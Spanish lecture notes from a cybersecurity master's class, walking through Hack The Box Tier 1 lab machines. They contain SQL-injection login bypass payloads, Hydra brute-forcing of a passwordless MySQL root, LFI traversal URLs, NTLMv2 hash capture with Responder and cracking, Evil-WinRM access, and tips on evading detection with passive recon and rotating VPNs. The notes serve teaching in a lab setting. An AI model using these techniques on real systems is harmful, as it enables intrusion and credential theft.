> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 27**
> **Módulo:** MODULO3
> **Tema:** Clase 27
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 27. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y objetivos de la sesión

Esta sesión la imparte **Dani**, continuando directamente desde donde lo dejó Yuba en la clase 26.

El grupo ya completó todo el **Tier 0** del Starting Point (4-5 máquinas: Meow, Fawn, Dancing, Redeemer).

Hoy se trabajan las máquinas del **Tier 1**, que añaden más complejidad: aparecen SQL Injection, MySQL, LFI y captura de hashes NTLM.

**Dinámica de clase:** se deja 10 minutos para que los alumnos intenten cada máquina solos, y después se resuelve en conjunto.

El profesor insiste en **no copiar la solución directamente**: pelear con la máquina, aunque cueste, es lo que forma el razonamiento.

**Objetivo pedagógico:** la misma vulnerabilidad se presenta en servicios distintos una y otra vez.

Con suficientes repeticiones, los conceptos se automatizan y se aplican sin necesidad de recordar cada comando.

## 2.

Herramientas de enumeración web repasadas

### WhatWeb

Al encontrar una web, siempre lanzar **WhatWeb** para detectar las tecnologías del servidor:

whatweb http://IP_OBJETIVO

Devuelve: servidor web (Apache, nginx), versión de PHP, CMS, frameworks, cabeceras de seguridad, etc.

Información esencial antes de atacar.

### FFUF, Feroxbuster y GoBuster --- fuzzing de directorios

Tres herramientas equivalentes para descubrir directorios y ficheros ocultos:

# FFUF (visto en clases anteriores)

ffuf -u http://IP/FUZZ -w /ruta/diccionario -c

# GoBuster — muy común, salida limpia

gobuster dir -u http://IP -w /ruta/diccionario

# Feroxbuster — fuzzing recursivo (encuentra subdirectorios dentro de directorios)

feroxbuster --url http://IP/ruta/

**Filtrar resultados con FFUF:** cuando muchos resultados devuelven el mismo tamaño de respuesta (todos son la misma página de error), filtrar por tamaño con `-fs TAMAÑO` para eliminar el ruido.

**Diccionarios recomendados:** - `/usr/share/dirb/wordlists/common.txt` → rápido, primer escaneo. - **SecLists** (`directory-list-2.3-medium.txt`) → exhaustivo, segunda pasada.

Instalación: `git clone https://github.com/danielmiessler/SecLists`.

## 3.

Máquina: Appointment (Tier 1 --- SQL Injection en login)

### Reconocimiento

```bash
mkdir appointment && cd appointment && mkdir recon nmap -sV -Pn -v -oA recon/appointment IP_OBJETIVO
```

Puerto 80 abierto → Apache con panel de login PHP.

### Vulnerabilidad: SQL Injection en formulario de login

La aplicación PHP realiza una consulta SQL parecida a esta:

SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'

Si el input del usuario no está sanitizado, se puede **modificar la consulta** inyectando caracteres especiales.

### Método 1 --- Comentario de hash (`admin'#`)

Username: admin'# Password: (cualquier cosa)

**Lo que llega al servidor:**

SELECT * FROM users WHERE username='admin'# AND password='hola'

El carácter `#` es un **comentario** en MySQL.

Todo lo que va después queda ignorado, incluida la verificación de contraseña.

El servidor comprueba solo si existe el usuario `admin`, y como existe, permite el acceso.

### Método 2 --- OR siempre verdadero (`admin' OR 1=1--`)

Username: admin' OR 1=1-- Password: (cualquier cosa)

**Lo que llega al servidor:**

SELECT * FROM users WHERE username='admin' OR 1=1-- AND password='hola'

El operador `OR` hace que se cumpla la condición si **al menos una** es verdadera.

Como `1=1` siempre es verdadero, la consulta devuelve resultados independientemente del usuario y contraseña.

**Variante con AND:**

Username: admin' AND 1=1-- Password: (cualquier cosa)

Aquí se tienen que cumplir las **dos** condiciones: que el usuario sea `admin` Y que `1=1`.

Como `1=1` siempre se cumple, solo depende de que exista el usuario `admin`.

### La defensa: consultas parametrizadas

La forma correcta de evitar SQLi es usar **consultas parametrizadas** (prepared statements), donde el código y los datos viajan separados:

// VULNERABLE (concatenación directa): $query = "SELECT * FROM users WHERE username='$usuario' AND password='$pass'";

// SEGURO (consulta parametrizada): $stmt = $pdo->prepare("SELECT * FROM users WHERE username=?

AND password=?"); $stmt->execute([$usuario, $pass]);

En la versión segura, el input del usuario se trata siempre como **dato literal**, nunca como parte del código SQL.

No importa lo que se meta en el campo: la comilla se busca literalmente en la base de datos, no cierra ninguna consulta.

**Referencia metodológica:** OWASP --- la SQL Injection aparece en el Top 10 de vulnerabilidades web.

En owasp.org se puede consultar la metodología de ataque y defensa de cada vulnerabilidad.

### Preguntas guiadas de la máquina

- ¿Qué lenguaje de base de datos se usa? → SQL (*Structured Query Language*)
- ¿Qué hace la inyección SQL? → Modificar la lógica de la consulta original
- ¿Cómo se previene? → Consultas parametrizadas

## 4.

Máquina: Sequel (Tier 1 --- MySQL sin contraseña)

### Reconocimiento

```bash
nmap -sV -Pn -v -oA recon/sequel IP_OBJETIVO
```

Puerto 3306 abierto → **MySQL**.

### Fuerza bruta con Hydra (flag `-e n`)

hydra -l root -P /usr/share/wordlists/rockyou.txt IP mysql -e n

> [!important] **El flag** `-e n` es clave: además de probar las contraseñas del diccionario, prueba también **contraseñas nulas** (vacías).

En este caso, Hydra detecta que el usuario `root` no tiene contraseña.

### Conexión a MySQL

mysql -u root -h IP --skip-ssl

El flag `--skip-ssl` es necesario porque Kali puede intentar una conexión SSL que la versión antigua de MySQL no soporta y rechaza.

### Navegación por MySQL

show databases; -- Listar todas las bases de datos use htb; -- Seleccionar la base de datos "htb" show tables; -- Listar las tablas de la BD seleccionada describe config; -- Ver la estructura (columnas y tipos) de la tabla "config" select * from config; -- Ver todos los datos de la tabla "config"

**La flag** estaba en el campo `value` de la tabla `config` de la base de datos `htb`.

`DESCRIBE` **vs** `SELECT *`**:** - `DESCRIBE tabla` → muestra la **estructura** (nombres de columnas y tipos de datos). - `SELECT * FROM tabla` → muestra los **datos** (filas con valores).

Para encontrar la flag hay que usar `SELECT *`.

### Preguntas guiadas de la máquina

- Puerto de MySQL → 3306
- Herramienta para conectarse → `mysql`
- Flag de Hydra para probar contraseña nula → `-e n`
- ¿Cómo se listan las bases de datos? → `show databases;`
- ¿Cómo se selecciona una BD? → `use nombre;`
- ¿Cómo se listan las tablas? → `show tables;`
- ¿Cómo se ven los datos de una tabla? → `select * from tabla;`

## 5.

Máquina: Dancing (Tier 1 --- SMB sin credenciales)

### Reconocimiento

```bash
nmap -sV -Pn -v -oA recon/dancing IP_OBJETIVO
```

Puertos 139 y 445 abiertos → **SMB**.

### Enumeración de recursos compartidos

smbclient -N -L //IP_OBJETIVO/

Lista los recursos compartidos disponibles sin credenciales.

En entornos reales se han encontrado nóminas, credenciales y documentación confidencial en carpetas SMB mal configuradas.

### Conectar a un recurso específico

smbclient //IP_OBJETIVO/WorkShares -N

Una vez dentro:

```bash
ls # Listar contenido cd directorio # Entrar en directorio get flag.txt # Descargar fichero
```

La flag estaba en uno de los subdirectorios del recurso compartido.

### Preguntas guiadas de la máquina

- Puerto SMB → 445 (y 139 para NetBIOS)
- Herramienta para listar recursos → `smbclient`
- Flag para sesión sin credenciales → `-N`
- Flag para listar recursos → `-L`
- ¿Cuántos recursos tiene la máquina? → (según el output de smbclient)
- Comando para descargar un fichero dentro de SMB → `get`

## 6.

Máquina: Responder (Tier 1 --- LFI + NTLMv2 hash + Evil-WinRM)

Esta es la máquina más compleja del Tier 1.

Combina tres vulnerabilidades encadenadas: **LFI** (Local File Inclusion), **captura de hash NTLMv2** con la herramienta Responder, y acceso por **Evil-WinRM**.

### Paso 1 --- Reconocimiento y configuración del /etc/hosts

```bash
nmap -sV -Pn -v -oA recon/responder IP_OBJETIVO
```

Nmap detecta que la IP redirige a un dominio (ej. `unika.htb`).

Al acceder por el navegador, la web no carga porque el sistema no sabe resolver ese dominio.

**Solución:** añadir la entrada al `/etc/hosts` local para que la resolución DNS se haga localmente:

```bash
sudo nano /etc/hosts
```

# Añadir al final:

IP_OBJETIVO unika.htb

Guardar con `Ctrl+O` → Enter → `Ctrl+X`.

Ahora al acceder a `http://unika.htb` la web carga correctamente.

**Por qué funciona:** el fichero `/etc/hosts` es la "guía telefónica local" del sistema.

Antes de consultar al servidor DNS externo, Linux comprueba este fichero.

Al añadir la entrada, el sistema sabe que `unika.htb` corresponde a esa IP sin necesidad de resolución DNS real.

### Paso 2 --- Identificar el LFI

La web tiene un parámetro `?page=` en la URL que carga ficheros del servidor:

http://unika.htb/?page=french.html

**LFI (Local File Inclusion):** si el parámetro `page` no está sanitizado, se puede usar para leer ficheros del sistema usando `../` para navegar hacia atrás en el árbol de directorios.

**Confirmar el LFI** intentando leer el fichero `hosts` de Windows:

http://unika.htb/?page=../../../../../../../../windows/system32/drivers/etc/hosts

Si la web devuelve el contenido del fichero `hosts` de Windows, el LFI está confirmado.

La cantidad de `../` da igual mientras sean suficientes --- el sistema para al llegar a la raíz.

### Paso 3 --- Capturar el hash NTLMv2 con Responder

**Responder** es una herramienta que se pone en escucha en la red y captura hashes de autenticación NTLMv2 cuando un sistema Windows intenta conectarse a una carpeta compartida que no existe.

**Activar Responder en la interfaz tun0 (la VPN de HTB):**

```bash
sudo responder -I tun0
```

Responder queda en escucha.

Ahora hay que hacer que la máquina víctima intente conectarse a nosotros.

Usando el LFI:

http://unika.htb/?page=//IP_KALI/carpeta_inventada

La notación `//IP//carpeta` es la sintaxis de rutas UNC de Windows para acceder a carpetas de red.

Al procesar esta URL, el servidor Windows intenta conectarse a nuestra IP buscando la carpeta.

Como nuestra IP está escuchando con Responder, captura el hash NTLMv2 del usuario que ejecuta el servicio web.

**Resultado:** Responder muestra el hash NTLMv2 del usuario `administrator`.

⚠️ **Problema frecuente con Responder y VPNs:** si se han creado múltiples adaptadores tun0, tun1, tun2 accidentalmente (por relanzar la VPN varias veces), Responder puede no funcionar.

Verificar con `ifconfig` que solo existe un adaptador `tun0`.

### Paso 4 --- Romper el hash con John

# Guardar el hash en un fichero

```bash
echo "HASH_COPIADO_DE_RESPONDER" > hash.txt
```

# Romper con John usando RockYou

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

John detecta automáticamente el formato NTLMv2.

La contraseña del usuario `administrator` en la demo resultó ser `badminton`.

### Paso 5 --- Conectar con Evil-WinRM

**WinRM** (*Windows Remote Management*) es el protocolo de administración remota de Windows.

Usa el puerto **5985**. **Evil-WinRM** es la herramienta de Linux para conectarse a él:

evil-winrm -i IP_OBJETIVO -u administrator -p badminton

Una vez dentro: shell de PowerShell completa en la máquina Windows.

### Paso 6 --- Encontrar la flag

Las flags en HTB siempre están en el **Desktop** del usuario: - Linux: `/home/usuario/Desktop/flag.txt` o `/root/flag.txt` - Windows: `C:\Users\usuario\Desktop\flag.txt`

# En la shell de Evil-WinRM (PowerShell)

```bash
cd C:\Users\mike\Desktop dir type flag.txt
```

**Buscar la flag recursivamente si no se sabe la ruta:**

Get-ChildItem -Recurse -Filter flag.txt

**Método alternativo descubierto por un alumno:** usando el LFI directamente para leer la flag sin pasar por Responder:

http://unika.htb/?page=../../../../../../../../users/mike/desktop/flag.txt

Si el servicio web tiene permisos para leer ese fichero, el LFI devuelve el contenido directamente.

Es una solución válida aunque no usa la vía principal (Responder → John → Evil-WinRM).

## 7.

Debate: Nmap es ruidoso --- alternativas pasivas

Un alumno planteó la duda de que en auditorías reales el Blue Team detecta Nmap al instante.

El profesor confirmó y amplió el contexto:

### Cuándo usar herramientas pasivas

En ejercicios de Red Team donde se está probando la capacidad de detección del SOC, hay que ir desde el principio con el **mínimo ruido posible**.

En esos casos:

- **Shodan:** buscar la IP del objetivo directamente en Shodan.

Alguien ya habrá escaneado esa IP y los puertos abiertos están indexados sin que el defensor lo detecte.
- **crt.sh:** buscar subdominios a través de certificados SSL/TLS públicos.

No hace ninguna petición al objetivo.
- **Wireshark en modo escucha:** conectarse a la red objetivo y escuchar el tráfico pasivamente.

Se ven las IPs que se comunican, los rangos de red, los servicios activos --- todo sin emitir un solo paquete.

### Cuándo usar Nmap

En auditorías donde el cliente sabe que se está auditando (contrato firmado, alcance definido), Nmap es perfectamente válido.

El ruido es esperado y aceptado.

La mayor parte de las auditorías de caja negra y caja gris entran en esta categoría.

En entornos con IPS/IDS que bloquean IPs activas: usar VPNs rotativas (cada cierto número de peticiones cambiar de IP) para distribuir el escaneo y evitar el bloqueo.

## 8.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
 --------------------------------------- -------------------------------------------------------------------------------------------------------
 *Hubdebox / HaddeVox / Hot de Box* **Hack The Box (HTB)** -- plataforma de práctica de hacking
 *la de pointment / appointment* **Appointment** -- máquina HTB Tier 1 (SQL Injection en login)
 *Seguil / Sekuel / Serie* **Sequel** -- máquina HTB Tier 1 (MySQL sin contraseña)
 *Cocodrilo / Crocodile* **Crocodile** -- máquina HTB Tier 0 (FTP anónimo con credenciales)
 *la de responder / Responde* **Responder** -- máquina HTB Tier 1 (LFI + NTLMv2 + Evil-WinRM)
 *FenosButster / Ferox Buster* **Feroxbuster** -- fuzzing web recursivo
 *GoBuster / GoogleBaster* **Gobuster** -- fuzzing web de directorios
 *la de funcionar / FFF UF* **FFUF** (*Fuzz Faster U Fool*) -- fuzzing web
 *SQL Inyection / Second Injecttion* **SQL Injection (SQLi)** -- inyección de código en consultas SQL
 *consultas parametizadas / parámetro* **Consultas parametrizadas** (*Prepared Statements*) -- defensa contra SQLi
 *local five inclusing / LFI* **LFI** (*Local File Inclusion*) -- vulnerabilidad que permite leer ficheros locales del servidor
 *Edentlm / NTM / NTLMv2* **NTLMv2** (*NT LAN Manager v2*) -- protocolo de autenticación Windows; el hash que captura Responder
 *BillWin / WinRM / Evil WinRM* **Evil-WinRM** -- herramienta para conectarse a Windows vía WinRM desde Linux
 *WinRM / Win RM* **WinRM** (*Windows Remote Management*) -- protocolo de administración remota de Windows, puerto 5985
 *Toon Zero / TC 0 / tun cero* **tun0** -- adaptador de red VPN de HTB
 *ETC Host / ITC Host* `/etc/hosts` -- fichero de resolución DNS local en Linux
 *Unica punto HTV / unica punto HTML* `unika.htb` -- nombre de dominio de la máquina Responder
 *Souda* **Shodan** -- motor de búsqueda de activos expuestos en Internet
 *CRT punto CH* **crt.sh** -- buscador de certificados SSL/TLS para enumeración de subdominios
 *Get Shield Item / Get Shield* `Get-ChildItem -Recurse -Filter flag.txt` -- comando PowerShell para buscar la flag recursivamente
 *Claudia / Claude / Claudio* **Claude** (Anthropic) -- IA usada por los alumnos para resolver dudas y desbloquear máquinas
 *OWASP* **OWASP** (*Open Web Application Security Project*) -- referencia metodológica de vulnerabilidades web

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*